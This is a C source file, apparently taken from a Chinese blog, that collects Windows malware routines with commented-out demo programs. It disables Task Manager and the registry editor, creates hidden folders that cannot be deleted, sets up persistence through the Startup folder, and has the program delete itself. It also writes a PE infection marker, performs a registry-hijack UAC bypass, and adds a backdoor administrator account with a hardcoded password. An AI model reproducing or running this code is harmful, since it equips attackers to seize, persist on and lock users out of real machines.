// https://www.cnblogs.com/LyShark/p/13420509.html


#include <stdio.h>
#include <stddef.h>
#include <shlobj.h>
#include <assert.h> 
#include <lm.h>
#include <windows.h>
#define VIRUSFLAGS 0xCCCC
#pragma comment(lib, "shell32.lib")
#pragma comment(lib,"netapi32")


// 禁用系统任务管理器
void RegTaskmanagerForbidden()
{
	HKEY hkey;
	DWORD value = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

// 禁用注册表编辑器
void RegEditForbidden()
{
	HKEY hkey;
	DWORD value = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

// 干掉桌面壁纸
void RegModifyBackroud()
{
	DWORD value = 1;
	HKEY hkey;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
	RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
}


// 添加不可删除文件
BOOL SetImmunity(char *FilePath,char *FileName)
{
	char file[2048] = { 0 };

	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);
	BOOL bRet = CreateDirectory(file, NULL);
	if (bRet)
	{
		// 创建无法删除的文件夹
		strcat(file, "\\anti...\\");
		bRet = CreateDirectory(file, NULL);
		if (bRet)
		{
			// 设置文件为隐藏属性
			SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);
			return TRUE;
		}
	}
	return FALSE;
}

// 删除无法删除文件
void ClearImmunity(char *FilePath, char *FileName)
{
	char file[2048] = { 0 };

	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);

	strcat(file, "\\anti...\\");
	RemoveDirectory(file);

	ZeroMemory(file, MAX_PATH);
	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);
	RemoveDirectory(file);
}

/*
int main(int argc, char * argv[])
{
	// 创建 autorun.inf 可免疫自动播放
	char *Fuck[4] = { "你", "好", "世", "界" };
	int FuckLen = sizeof(Fuck) / sizeof(int);

	TCHAR Destop[MAX_PATH];
	SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);	 // 获取桌面绝对路径

	for (int x = 0; x < FuckLen; x++)
	{
		SetImmunity("c://", Fuck[x]);
		//ClearImmunity("c://", Fuck[x]);
	}

	system("pause");
	return 0;
}*/


BOOL AutoRun_Startup(char *lpszSrcFilePath, char *lpszDestFileName)
{
	char szStartupPath[MAX_PATH] = { 0 };
	char szDestFilePath[MAX_PATH] = { 0 };

	// 获取快速启动目录路径
	SHGetSpecialFolderPath(NULL, szStartupPath, CSIDL_STARTUP, TRUE);
	printf("快速启动路径: %s\n", szStartupPath);
	// 构造拷贝的目的文件路径
	wsprintf(szDestFilePath, "%s\\%s", szStartupPath, lpszDestFileName);
	// 拷贝文件到快速启动目录下
	CopyFile(lpszSrcFilePath, szDestFilePath, FALSE);
	return TRUE;
}

/*
int main(int argc, char * argv[])
{
	AutoRun_Startup("c://main.exe", "main.exe");
	system("pause");
	return 0;
}
*/

// 重启自删除，不行
BOOL RebootDelete(char *pszFileName)
{
	// 重启删除文件
	char szTemp[MAX_PATH] = "\\\\?\\";
	::lstrcat(szTemp, pszFileName);
	BOOL bRet = ::MoveFileEx(szTemp, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	return bRet;
}

/*
int main(int argc, char * argv[])
{
	RebootDelete("C:\\shell.exe")

	system("pause");
	return 0;
}
*/

// 向指定文件写入感染标志
BOOL WriteSig(DWORD dwAddr, DWORD dwSig, HANDLE hFile)
{
	DWORD dwNum = 0;
	SetFilePointer(hFile, dwAddr, 0, FILE_BEGIN);
	WriteFile(hFile, &dwSig, sizeof(DWORD), &dwNum, NULL);
	return TRUE;
}
// 检查文件是否被感染
BOOL CheckSig(DWORD dwAddr, DWORD dwSig, HANDLE hFile)
{
	DWORD dwSigNum = 0;
	DWORD dwNum = 0;
	SetFilePointer(hFile, dwAddr, 0, FILE_BEGIN);
	ReadFile(hFile, &dwSigNum, sizeof(DWORD), &dwNum, NULL);

	if (dwSigNum == dwSig)
		return TRUE;
	return FALSE;
}

/*
int main(int argc, char* argv[])
{
	HANDLE hFile,hMap = NULL;
	LPVOID lpBase = NULL;

	hFile = CreateFile("c://1.exe",GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	hMap = CreateFileMapping(hFile,NULL,PAGE_READWRITE,0,0,0);
	lpBase = MapViewOfFile(hMap,FILE_MAP_READ | FILE_MAP_WRITE,0,0,0);

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
	PIMAGE_NT_HEADERS pNtHeader = NULL;
	PIMAGE_SECTION_HEADER pSec = NULL;
	IMAGE_SECTION_HEADER imgSec = { 0 };

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("文件非可执行文件 \n");
		return -1;
	}
	pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)lpBase + pDosHeader->e_lfanew);
	// 写入感染标志
	WriteSig(offsetof(IMAGE_DOS_HEADER, e_cblp), VIRUSFLAGS, hFile);

	// 返回真说明感染过
	if (CheckSig(offsetof(IMAGE_DOS_HEADER, e_cblp), VIRUSFLAGS, hFile))
	{
		printf("文件已被感染,无法重复感染. \n");
	}

	system("pause");
	return 0;
}
*/


BOOL SelfDel()
{
	SHELLEXECUTEINFO sei;
	TCHAR szModule[MAX_PATH], szComspec[MAX_PATH], szParams[MAX_PATH];

	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) &&
		(GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		lstrcpy(szParams, "/c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");
		// 设置结构成员.
		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = "Open";
		sei.lpFile = szComspec;
		sei.lpParameters = szParams;
		sei.lpDirectory = 0; sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
		// 创建cmd进程.
		if (ShellExecuteEx(&sei))
		{
			// 设置cmd进程的执行级别为空闲执行,使本程序有足够的时间从内存中退出.
			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
			// 将自身进程的优先级置高
			SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
			// 通知Windows资源浏览器,本程序文件已经被删除.
			SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
			return TRUE;
		}
	}
	return FALSE;
}

/*
int main(int argc, char* argv[])
{
	SelfDel();
	return 0;
}
*/


//关闭UAC
BOOL CloseUAC(char *lpszExePath)
{
	HKEY hKey = NULL;
	// 创建项
	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 
		0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (NULL == hKey)
	{
		return FALSE;
	}
	::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE *)lpszExePath, (1 + ::lstrlen(lpszExePath)));
	::RegCloseKey(hKey);
	return TRUE;
}

/*
int main(int argc,char *argv[])
{
	BOOL bRet = FALSE;
	PVOID OldValue = NULL;

	// 关闭文件重定位
	::Wow64DisableWow64FsRedirection(&OldValue);

	// 修改注册表
	bRet = CloseUAC("C:\\Windows\\System32\\cmd.exe");
	printf("已关闭 \n");
	// 恢复文件重定位
	::Wow64RevertWow64FsRedirection(OldValue);

	system("pause");
	return 0;
}
*/


// 添加恶意系统用户
void AddUser(LPWSTR UserName, LPWSTR Password)
{
	USER_INFO_1 user;
	user.usri1_name = UserName;
	user.usri1_password = Password;
	user.usri1_priv = USER_PRIV_USER;
	user.usri1_home_dir = NULL;
	user.usri1_comment = NULL;
	user.usri1_flags = UF_SCRIPT;
	user.usri1_script_path = NULL;

	//添加名为lysharks的用户,密码为sswordQq123 
	if (NetUserAdd(NULL, 1, (LPBYTE)&user, 0) == NERR_Success)
		printf("创建用户完成 \n");

	// 添加用户到administrators组
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = user.usri1_name;
	if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
		printf("添加到组完成 \n");
}

// 枚举系统用户
void EnumUser()
{
	LPUSER_INFO_0 pBuf = NULL;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0, dwTotalEntries = 0, dwResumeHandle = 0;
	DWORD i;
	NET_API_STATUS nStatus;
	LPTSTR pszServerName = NULL;
	do
	{
		nStatus = NetUserEnum((LPCWSTR)pszServerName, dwLevel, FILTER_NORMAL_ACCOUNT,
			(LPBYTE*)&pBuf, dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);

		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					assert(pTmpBuf != NULL);

					if (pTmpBuf == NULL)
					{
						break;
					}
					wprintf(L"%s\n", pTmpBuf->usri0_name, pTmpBuf);
					pTmpBuf++;
				}
			}
		}
		if (pBuf != NULL)
		{
			NetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} while (nStatus == ERROR_MORE_DATA);
	NetApiBufferFree(pBuf);
}


/*
int main(int argc, char *argv[])
{
	AddUser(L"lyshark", L"123123");
	EnumUser();

	system("pause");
	return 0;
}
*/